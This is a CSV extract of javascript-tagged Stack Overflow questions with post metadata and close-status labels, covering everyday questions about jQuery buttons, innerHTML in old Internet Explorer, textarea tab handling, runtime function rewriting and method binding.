PostId,PostCreationDate,OwnerUserId,OwnerCreationDate,ReputationAtPostCreation,OwnerUndeletedAnswerCountAtPostTime,Title,BodyMarkdown,Tag1,Tag2,Tag3,Tag4,Tag5,PostClosedDate,OpenStatus,OpenStatusInt,BodyLength,TitleLength,TitleConcatWithBody,NumberOfTags
4633473,01/08/2011 10:39:32,567935,01/08/2011 10:39:32,1,0,Russian Potter stemming on javascript,Someone has any exemple Russian Potter stemming on javascript?,javascript,,,,,01/08/2011 11:44:40,not a real question,1,9,5,Russian Potter stemming on javascript Someone has any exemple Russian Potter stemming on javascript?,1
11638672,07/24/2012 20:18:03,1549671,07/24/2012 19:10:07,1,0,create a button in jQuery,"how can I make an event in jQuery that add a ""like"" button every time I click ""creat"" button?

I have just a ""creat"" button , every time I click it I want a ""like"" button to be added to the  page",javascript,jquery,,,,07/24/2012 23:08:08,not a real question,1,42,5,"create a button in jQuery how can I make an event in jQuery that add a ""like"" button every time I click ""creat"" button?

I have just a ""creat"" button , every time I click it I want a ""like"" button to be added to the  page",2
9952343,03/31/2012 01:52:23,1231813,02/24/2012 22:54:59,8,0,Get a webpage 'object' in Javascript,"There is a webpage online that has a vast field of data I need to record.
And like every normal person I don't want to do it by hand.
So, is it possible to 'import' a webpage 'object' that would give me access to the data fields"". So like:

        myWebpage.getElementById(""field1"").value;
would return the data in the 'imported' field.
Any help on this would be appreciated. Or any other alternatives.
Thanks",javascript,webpage,,,,04/18/2012 05:57:17,not a real question,1,72,6,"Get a webpage 'object' in Javascript There is a webpage online that has a vast field of data I need to record.
And like every normal person I don't want to do it by hand.
So, is it possible to 'import' a webpage 'object' that would give me access to the data fields"". So like:

        myWebpage.getElementById(""field1"").value;
would return the data in the 'imported' field.
Any help on this would be appreciated. Or any other alternatives.
Thanks",2
6867313,07/29/2011 00:18:51,828584,07/04/2011 18:34:01,112,4,Practice exercises?,"Is there anything like: http://nathansjslessons.appspot.com/lesson?id=1000

Something where I can learn and practice javascript? I remember when I was going to start with c++, there was a list of practice exercises for command prompt programs. Anything like that for javascript?

I know the best way to improve is to figure out what I want to do and learn how to do it, but I'm able to do everything I want for the time being, and want to have the ability to do whatever else I want without having to learn it.",javascript,,,,,07/29/2011 12:38:41,not constructive,1,88,2,"Practice exercises? Is there anything like: http://nathansjslessons.appspot.com/lesson?id=1000

Something where I can learn and practice javascript? I remember when I was going to start with c++, there was a list of practice exercises for command prompt programs. Anything like that for javascript?

I know the best way to improve is to figure out what I want to do and learn how to do it, but I'm able to do everything I want for the time being, and want to have the ability to do whatever else I want without having to learn it.",1
7143805,08/22/2011 06:22:45,767177,05/24/2011 05:57:18,3,0,innerHTML in ie6/ie7 bug?,"I user the innerHTML for the code:

    <div>
       <span id=""tag""></span>
    </div>

    var i = 15;
    function timer(){
       var div = document.getElementById(""tag"");
       i--;
       setInterval(function(){
          div.innerHTML = i；// use innerHTML
          //div.removeChild(div.childNodes[0]);
          //div.appendChild(document.createTextNode(i));
          i--;
       },15000);
    }
    
    timer();

the ff,safari,chrome is ok, but in ie8 value is no change;



",javascript,internet-explorer-8,innerhtml,,,,open,0,132,4,"innerHTML in ie6/ie7 bug? I user the innerHTML for the code:

    <div>
       <span id=""tag""></span>
    </div>

    var i = 15;
    function timer(){
       var div = document.getElementById(""tag"");
       i--;
       setInterval(function(){
          div.innerHTML = i；// use innerHTML
          //div.removeChild(div.childNodes[0]);
          //div.appendChild(document.createTextNode(i));
          i--;
       },15000);
    }
    
    timer();

the ff,safari,chrome is ok, but in ie8 value is no change;



",3
7984122,11/02/2011 16:48:00,978122,10/04/2011 09:09:05,17,0,Webpage not working in Opera,"Opera isn't allowing me to enter anything in the input fields, nor does the Javascript appear to be working. Can anyone tell me why? Is this normal Opera behavior?

Code is here: http://pastebin.com/c46uB7GP

CSS is here: http://pastebin.com/TXWWM2Qu

Thank You.",javascript,html,css,opera,,11/02/2011 18:22:13,too localized,1,36,5,"Webpage not working in Opera Opera isn't allowing me to enter anything in the input fields, nor does the Javascript appear to be working. Can anyone tell me why? Is this normal Opera behavior?

Code is here: http://pastebin.com/c46uB7GP

CSS is here: http://pastebin.com/TXWWM2Qu

Thank You.",4
8047533,11/08/2011 08:09:34,163373,08/26/2009 09:37:33,505,0,Focus on text area after tab in prototype javascript library,"I am trying to make a text area tab-aware and as a part of it I have written the following javascript. I am using prototype js library,

    document.observe(""dom:loaded"", function (){
		$('tabawaretextarea').observe('keydown',function(e) {
				if(e.keyCode === 9) { // tab was pressed
				$('tabawaretextarea').value = $F('tabawaretextarea')+""\t"";
				return false;
			}
		})
	});

As expected, the tabs are getting appended at the end. However, my text area loses the focuse and the HTML element next to the text area is getting focused. I believe the return false should do the magic but it does not. 

Any suggestions?",javascript,javascript-events,prototype,focus,prototypejs,,open,0,87,10,"Focus on text area after tab in prototype javascript library I am trying to make a text area tab-aware and as a part of it I have written the following javascript. I am using prototype js library,

    document.observe(""dom:loaded"", function (){
		$('tabawaretextarea').observe('keydown',function(e) {
				if(e.keyCode === 9) { // tab was pressed
				$('tabawaretextarea').value = $F('tabawaretextarea')+""\t"";
				return false;
			}
		})
	});

As expected, the tabs are getting appended at the end. However, my text area loses the focuse and the HTML element next to the text area is getting focused. I believe the return false should do the magic but it does not. 

Any suggestions?",5
3472370,08/12/2010 21:56:31,403397,07/27/2010 12:52:50,1,1,How can dynmically change a line of a JavaScript function?,"Suppose I had the following function:

    function alertMesg()
    {
       alert(""This ok function alerts message!"");
    }

Now at run time I would like to change the alertMesg function to do something else.  My thought was to do somehting like this.

    var temp = window.alertMesg.toString.replace(""ok"",""great"")
    temp = temp.replace('function alertMesg()',"""");
    window.alertMesg = new Function(temp);

Basically, the problem is I have no control over the source in the alertMesg function.  I would like change the function, but I can't actually change the source of it.  Because it is produced server side.  That being said I need it to act differently.

Thanks,
Grae

PS: I forgot to mention an important part.  I have to keep most of the function.  I can't just replace the function out right.  I have to keep 95% of the function the way it is, and change the other five percent.",javascript,jsf,dynamic,source,,,open,0,166,10,"How can dynmically change a line of a JavaScript function? Suppose I had the following function:

    function alertMesg()
    {
       alert(""This ok function alerts message!"");
    }

Now at run time I would like to change the alertMesg function to do something else.  My thought was to do somehting like this.

    var temp = window.alertMesg.toString.replace(""ok"",""great"")
    temp = temp.replace('function alertMesg()',"""");
    window.alertMesg = new Function(temp);

Basically, the problem is I have no control over the source in the alertMesg function.  I would like change the function, but I can't actually change the source of it.  Because it is produced server side.  That being said I need it to act differently.

Thanks,
Grae

PS: I forgot to mention an important part.  I have to keep most of the function.  I can't just replace the function out right.  I have to keep 95% of the function the way it is, and change the other five percent.",4
9707338,03/14/2012 17:53:22,710137,04/15/2011 15:54:11,8,1,How to Retain the Styling / Hover Functionality of Image Hyperlinks in a GridView TemplateField using ImageButtons,"Within each row of a GridView (using the TemplateField), I would like to display image buttons that will be used to control the data in that row. I would then like to swap out the images of the buttons when a user first hovers over the GridView row and then again when the user hovers over a specific button.

I can easily accomplish this hover functionality using CSS and image hyperlinks, however when using image hyperlinks, I am unable to raise any server-side events to handle editing the particular row.

In the past, I've used ImageButtons instead of image hyperlinks. I added the CommandName parameter to the ImageButtons and then handled the GridView RowCommand in code:

    <asp:ImageButton ID=""btnSelect"" CommandName=""select"" runat=""server"" ImageUrl=""~/images/iconSelect.png"" />

In order to change the ImageButton image on hover, I used Javascript:

    <asp:ImageButton ID=""btnSelect"" onmouseover=""this.src='../images/iconSelectOver.png';"" onmouseout=""this.src='../images/iconSelect.png';"" runat=""server"" ImageUrl=""~/images/iconSelect.png"" />

However, in this case, I need to also replace the ImageButton image when a user first hovers over the GridView row itself.  

To sum up, when a user hovers over a GridView row, the ImageButtons on that row will all swap image1 for image2.  Then when a user hovers over a specific ImageButton, its image will switch from image2 to image 3.  

Thanks in advance for any suggestions you may have as to the best approach.

",javascript,gridview,hover,imagebutton,templatefield,,open,0,222,17,"How to Retain the Styling / Hover Functionality of Image Hyperlinks in a GridView TemplateField using ImageButtons Within each row of a GridView (using the TemplateField), I would like to display image buttons that will be used to control the data in that row. I would then like to swap out the images of the buttons when a user first hovers over the GridView row and then again when the user hovers over a specific button.

I can easily accomplish this hover functionality using CSS and image hyperlinks, however when using image hyperlinks, I am unable to raise any server-side events to handle editing the particular row.

In the past, I've used ImageButtons instead of image hyperlinks. I added the CommandName parameter to the ImageButtons and then handled the GridView RowCommand in code:

    <asp:ImageButton ID=""btnSelect"" CommandName=""select"" runat=""server"" ImageUrl=""~/images/iconSelect.png"" />

In order to change the ImageButton image on hover, I used Javascript:

    <asp:ImageButton ID=""btnSelect"" onmouseover=""this.src='../images/iconSelectOver.png';"" onmouseout=""this.src='../images/iconSelect.png';"" runat=""server"" ImageUrl=""~/images/iconSelect.png"" />

However, in this case, I need to also replace the ImageButton image when a user first hovers over the GridView row itself.  

To sum up, when a user hovers over a GridView row, the ImageButtons on that row will all swap image1 for image2.  Then when a user hovers over a specific ImageButton, its image will switch from image2 to image 3.  

Thanks in advance for any suggestions you may have as to the best approach.

",5
2983926,06/06/2010 10:50:35,191090,10/16/2009 09:03:50,20,0,How can I pass methods in javascript?,"I often need to pass methods from objects into other objects. However I usually want the method to be attached to the original object (by attached I mean 'this' should refer to the original object). I know a few ways to do this:

a) In the object constructor: `ObjectA = function() { var that = this; var method = function(a,b,c) { that.abc = a+b+c }}`

b) In objectA which has been passed objectB: `objectB.assign(function(a,b,c) { that.method(a,b,c) })`

c) Outside both objects: `objectB.assign(function(a,b,c) { objectA.method(a,b,c) })`

I want to know if there is a simpler way to pass methods attached to their original objects.",javascript,functional-programming,oop,,,,open,0,99,7,"How can I pass methods in javascript? I often need to pass methods from objects into other objects. However I usually want the method to be attached to the original object (by attached I mean 'this' should refer to the original object). I know a few ways to do this:

a) In the object constructor: `ObjectA = function() { var that = this; var method = function(a,b,c) { that.abc = a+b+c }}`

b) In objectA which has been passed objectB: `objectB.assign(function(a,b,c) { that.method(a,b,c) })`

c) Outside both objects: `objectB.assign(function(a,b,c) { objectA.method(a,b,c) })`

I want to know if there is a simpler way to pass methods attached to their original objects.",3
